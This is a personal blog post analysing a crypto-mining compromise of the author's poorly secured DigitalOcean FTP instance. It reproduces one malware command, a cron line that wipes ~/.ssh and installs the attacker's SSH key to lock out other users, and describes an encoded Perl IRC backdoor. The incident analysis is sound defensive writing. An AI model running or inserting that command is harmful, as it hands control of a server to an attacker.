<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Anatomy of a crypto mining hack - Dan Goldin</title><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=referrer content="no-referrer"><meta name=description content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code."><meta property="og:site_name" content="Dan Goldin"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:url" content="/2020/05/29/anatomy-of-a-crypto-mining-hack/"><meta property="og:title" content="Anatomy of a crypto mining hack"><meta property="og:image" content="//image/digitalocean-cpu-alert.png"><meta property="og:description" content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code."><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@dangoldin"><meta name=twitter:creator content="@dangoldin"><meta name=twitter:title content="Anatomy of a crypto mining hack"><meta name=twitter:description content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code."><meta name=twitter:image content="//image/digitalocean-cpu-alert.png"><link rel=canonical href=/2020/05/29/anatomy-of-a-crypto-mining-hack/><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin=anonymous><link rel=stylesheet href=https://nanx-assets.netlify.app/fonts.css><link rel=stylesheet href=/css/custom.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github-gist.min.css integrity="sha512-od7JLoOTxM8w/HSKGzP9Kexc20K9p/M2zxSWsd7H1e4Ctf+8SQFtCWEZnW5u6ul5ehSECa5QmOk9ju2nQMmlVA==" crossorigin=anonymous><link rel="shortcut icon" href=/favicon.png><link href=/index.xml rel=alternate type=application/rss+xml title="Dan Goldin"><script async src="https://www.googletagmanager.com/gtag/js?id=UA-36313127-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-36313127-1')</script></head><body><div class="my-4 my-lg-5 header"><div class=container><div class=row><div class="col-auto offset-lg-2 d-none d-lg-block"><a href=/><img class="ml-lg-4 logo img-fluid d-block rounded-circle" src=/image/photo.jpg alt=logo></a></div><div class="col-auto align-self-center mr-auto"><a href=/><h1 class=name>Dan Goldin</h1></a><ul class="nav nav-primary"><li class=nav-item><a class="nav-link text-home" href=/>Home</a></li><li class=nav-item><a class="nav-link text-about" href=/about/>About</a></li><li class=nav-item><a class="nav-link text-lore" href=/lore/>Lore</a></li></ul></div></div></div></div><div class=content><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-lg-8"><h1 class="mx-0 mx-md-4 blog-post-title">Anatomy of a crypto mining hack</h1><div class="mb-md-4 meta"><span class="date middot" title="Fri May 29 2020 00:00:00 UTC">2020-05-29</span>
<span class="reading-time middot">3 min read</span><div class="d-none d-md-inline tags"><ul class="list-unstyled d-inline"><li class="d-inline middot"><a href=/tags/code>code</a></li></ul></div><div class="d-none d-md-inline tags"><ul class="list-unstyled d-inline"></ul></div></div><div class="markdown blog-post-content"><p>A few months ago I set up a simple ftp server to help a friend. I took a few security shortcuts which came to bite me this week when I received an alert from DigitalOcean that an instance was running hot.</p><p><img src=/image/digitalocean-cpu-alert.png alt="DigitalOcean CPU Alert" data-width=503 data-height=280 data-layout=responsive></p><p>I dug into it and noticed a series of processes being run by the ftp_user - the most impactful was a command called rsync. I&rsquo;m familiar with rsync which syncs files across devices - and this was nothing like that. At this point I realized that I got hacked and quickly disabled the user and killed all its processes. The CPU usage dropped back to normal and now it was time to dig into the damage.</p><p>Note that I’m far from a security engineer but am reasonably comfortable on the command line. The user was not a sudo account and this was a non critical instance so I wasn&rsquo;t too worried about the impact. In fact, I actually enjoyed the exercise of digging in and trying to see how I was hacked and how the entire script worked.</p><p>The origin of the hack was that I was sloppy when I created the ftp account and gave it both a weak password and didn&rsquo;t disable password-based authentication for SSH. This led to the attacker brute forcing the password and getting access to the ftp_user&rsquo;s home folder on the instance. Once there, the attacker downloaded a bunch of code that both embedded itself in the system and then started running a miner.</p><p>Before I got rid of the code I took the liberty of committing it to <a href=https://github.com/dangoldin/crypto-miner-hack>GitHub</a> in order to preserve and share with others. That also gave me the time to dig in and see how it actually worked.</p><p>One of the first things I noticed was how obfuscated the code was. The file names and folders were either named after existing programs or were hidden files and directories. In addition, the names were completely nonsensical and intricately linked which made it difficult to trace the execution. I didn&rsquo;t go through the code step by step by digging into the files and found a few interesting tidbits.</p><p>One was that the <a href=https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L5>code created</a> a cron job that would wipe the .ssh folder and then add a single ssh key - thereby locking every other user out.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cd ~ <span style=color:#f92672>&amp;&amp;</span> rm -rf .ssh <span style=color:#f92672>&amp;&amp;</span> mkdir .ssh <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&#34;</span>&gt;&gt;.ssh/authorized_keys <span style=color:#f92672>&amp;&amp;</span> chmod -R go<span style=color:#f92672>=</span> ~/.ssh</code></pre></div><p>Another was that there was a <a href=https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/a/init0>script to kill</a> other miners. I assume the motivation here was to realize that if this instance was dumb enough to get hacked then it was probably hacked by someone else already so let&rsquo;s put a stop to that.</p><p>The most interesting part was an <a href=https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L4>encoded string</a> that was passed into the Perl interpreter. The first step decoded it into a highly obfuscated Perl program and the <a href=https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_2_safe_obfuscated>subsequent step</a> executed it through an eval. The <a href=https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_3_safe_decoded>code itself</a> is fascinating and those more knowledgeable <a href=https://malware.news/t/dota-campaign-analyzing-a-coin-mining-and-remote-access-hybrid-campaign/30326>figured out</a> it was connecting and listening to commands from an IRC server.</p><p>There&rsquo;s a fascinating amount of research one can do here to understand everything the hackers managed to do and yet it&rsquo;s a world most of us are only tangentially aware of. There are clear lessons here. One is to take security seriously even if it is a toy project - in this case both a strong password and limiting password-based SSH would have stopped the hack. The other is that even simpler monitoring is a huge help. If DigitalOcean had not sent me the alert my instance would still be mining cryptocoins. And the last one is that running a honeypot is an insightful experience and gives you a chance to learn something new and flex those debugging muscles.</p></div><div class=navigation><div class=row><div class="col-12 col-lg-6"><div class="mx-0 mx-md-4 mt-4 text-left"><a href=/2020/05/27/metrics-logging-and-error-reporting/>« Metrics, logging, and error reporting</a></div></div><div class="col-12 col-lg-6"><div class="mx-0 mx-md-4 mt-4 text-right"><a href=/2020/05/30/three-categories-of-software-engineering-work/>Three categories of software engineering work »</a></div></div></div></div></div></div></div></div><section id=comments><div class="py-3 content"><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-lg-8"><div class=comments><script src=https://utteranc.es/client.js repo=dangoldin/blog.dangoldin.com-comments issue-term=pathname label=comment theme=github-light crossorigin=anonymous async></script></div></div></div></div></div></section><div class="my-4 footer"><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-lg-8"><hr></div></div><div class="row justify-content-center"><div class="col-sm-12 col-lg-2"><div class="mx-0 mx-md-4 site-copyright">© 2021 Dan Goldin</div></div><div class="col-sm-12 col-lg-6"><div class="mx-0 mx-md-4 site-social"><ul><li><a href=mailto:dan@dangoldin.com>Contact</a></li><li><a href=https://github.com/dangoldin target=_blank>GitHub</a></li><li><a href=https://twitter.com/dangoldin target=_blank>Twitter</a></li><li><a href=https://www.linkedin.com/in/dangoldin target=_blank>LinkedIn</a></li><li><a href=/index.xml class=mr-0>RSS</a></li></ul></div></div></div></div></div><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/r.min.js defer></script><script>window.addEventListener('load',function(){hljs.initHighlighting()},!0)</script></body></html>